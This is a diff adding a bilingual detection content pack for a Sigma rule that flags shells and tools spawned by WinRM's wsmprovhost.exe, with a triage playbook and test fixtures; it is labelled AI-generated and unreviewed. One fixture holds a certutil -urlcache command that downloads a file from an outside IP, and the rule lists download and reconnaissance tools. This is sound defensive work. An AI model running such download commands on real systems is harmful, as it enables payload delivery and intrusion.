@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "5cc2cda8-f261-4d88-a2de-e9e193c86716",
+    "title": "Suspicious Processes Spawned by WinRM",
+    "level": "high",
+    "status": "test",
+    "author": "Andreas Hunkeler (@Karneades), Markus Neis",
+    "path": "windows/process_creation/proc_creation_win_winrm_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_winrm_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1190"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "El proceso host de WinRM (wsmprovhost.exe) inició un shell o una herramienta que suele aparecer en reconocimiento, persistencia o descarga de archivos. Puede indicar ejecución remota de comandos por un atacante con credenciales válidas.",
+      "what_it_detects": "Eventos de creación de procesos en los que ParentImage termina en \\wsmprovhost.exe e Image es cmd.exe, sh.exe, bash.exe, powershell.exe, pwsh.exe, wsl.exe, schtasks.exe, certutil.exe, whoami.exe o bitsadmin.exe.",
+      "why_it_matters": "wsmprovhost.exe ejecuta los comandos de PowerShell Remoting y WinRM. Si inicia shells, whoami, certutil, bitsadmin o schtasks, puede haber reconocimiento, descarga de payloads o tareas programadas creadas en remoto. La regla está etiquetada con T1190 (explotación de aplicaciones expuestas), acceso inicial, persistencia y escalamiento de privilegios.",
+      "triage_steps": [
+        "Revise CommandLine del proceso hijo: busque URLs, -urlcache, /transfer, /create, comandos codificados (-enc) o rutas en carpetas temporales o de usuario.",
+        "Identifique la cuenta (User) y la sesión de logon. Confirme si ese usuario administra este host por WinRM habitualmente.",
+        "Busque en el Security log el evento 4624 de tipo 3 asociado y obtenga la IP de origen. Valide que corresponda a un servidor de administración conocido.",
+        "Revise el log Microsoft-Windows-WinRM/Operational y, si existe, el de PowerShell (4103/4104) para reconstruir los comandos ejecutados en la sesión.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos del shell, conexiones de red, archivos nuevos, tareas programadas y servicios creados.",
+        "Compruebe si la misma IP de origen o el mismo usuario generó sesiones WinRM o alertas en otros hosts (posible movimiento lateral).",
+        "Revise alertas previas de este host y de este usuario, y compare con los cambios aprobados o tickets de mantenimiento."
+      ],
+      "false_positives": [
+        "Administradores que ejecutan comandos con Invoke-Command o Enter-PSSession y lanzan cmd.exe, whoami.exe o schtasks.exe para soporte.",
+        "Herramientas de gestión de configuración o despliegue (por ejemplo, Ansible sobre WinRM, DSC o scripts de inventario) que invocan shells.",
+        "Escáneres de cumplimiento o de vulnerabilidades autenticados que usan WinRM y ejecutan whoami o cmd."
+      ],
+      "response_steps": [
+        "Confirme con el dueño de la cuenta o con el equipo de TI si la actividad estaba autorizada antes de actuar.",
+        "Si no está autorizada, aísle el endpoint, cierre las sesiones WinRM activas y deshabilite o restablezca la cuenta usada.",
+        "Elimine las tareas programadas, archivos descargados y servicios creados que hayan sido verificados como maliciosos; conserve copias y hashes como evidencia.",
+        "Restrinja WinRM a hosts de administración autorizados mediante firewall o GPO y revise otros sistemas a los que accedió la misma cuenta."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque estos hijos de wsmprovhost.exe indican ejecución remota interactiva con credenciales válidas, aunque la administración legítima obliga a validar el contexto."
+    },
+    "en": {
+      "summary": "The WinRM host process (wsmprovhost.exe) started a shell or a tool often used for reconnaissance, persistence or file download. This may mean an attacker with valid credentials is running commands remotely.",
+      "what_it_detects": "Process creation events where ParentImage ends with \\wsmprovhost.exe and Image is cmd.exe, sh.exe, bash.exe, powershell.exe, pwsh.exe, wsl.exe, schtasks.exe, certutil.exe, whoami.exe or bitsadmin.exe.",
+      "why_it_matters": "wsmprovhost.exe runs the commands sent over PowerShell Remoting and WinRM. When it starts shells, whoami, certutil, bitsadmin or schtasks, it can mean remote reconnaissance, payload download or scheduled task persistence. The rule is tagged T1190 (exploit public-facing application), initial access, persistence and privilege escalation.",
+      "triage_steps": [
+        "Read the child CommandLine: look for URLs, -urlcache, /transfer, /create, encoded commands (-enc) or paths in temp or user folders.",
+        "Identify the User and logon session. Confirm whether this account normally manages this host over WinRM.",
+        "Find the matching Security 4624 logon type 3 event and its source IP. Check that it belongs to a known management server.",
+        "Review Microsoft-Windows-WinRM/Operational and PowerShell logs (4103/4104), if available, to rebuild the commands run in the session.",
+        "Pivot on the same host +/- 15 minutes: children of the shell, network connections, new files, scheduled tasks and services.",
+        "Check whether the same source IP or user opened WinRM sessions or triggered alerts on other hosts (possible lateral movement).",
+        "Review earlier alerts for this host and user, and compare against approved changes or maintenance tickets."
+      ],
+      "false_positives": [
+        "Administrators using Invoke-Command or Enter-PSSession who run cmd.exe, whoami.exe or schtasks.exe for support work.",
+        "Configuration management or deployment tools (for example Ansible over WinRM, DSC or inventory scripts) that invoke shells.",
+        "Authenticated compliance or vulnerability scanners that use WinRM and run whoami or cmd."
+      ],
+      "response_steps": [
+        "Confirm with the account owner or IT team whether the activity was authorized before acting.",
+        "If unauthorized, isolate the endpoint, end active WinRM sessions and disable or reset the account used.",
+        "Remove scheduled tasks, downloaded files and services verified as malicious; keep copies and hashes as evidence.",
+        "Restrict WinRM to authorized management hosts with firewall rules or GPO, and review other systems the same account reached."
+      ],
+      "severity_rationale": "High fits because these wsmprovhost.exe children indicate remote command execution with valid credentials, though legitimate administration means context must be validated."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "whoami.exe started by wsmprovhost.exe during a remote PowerShell session",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\wsmprovhost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\whoami.exe\" /all",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "certutil.exe downloading a file, launched from the WinRM host process",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-07.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "ParentImage": "C:\\Windows\\System32\\wsmprovhost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -f http://198.51.100.23/update.txt C:\\Users\\Public\\update.txt",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "wsmprovhost.exe starting ipconfig.exe, which is not in the rule's list of child images",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\wsmprovhost.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+          "Image": "C:\\Windows\\System32\\ipconfig.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\ipconfig.exe\" /all",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "whoami.exe run from a local interactive cmd.exe, not from WinRM",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\"",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "whoami",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
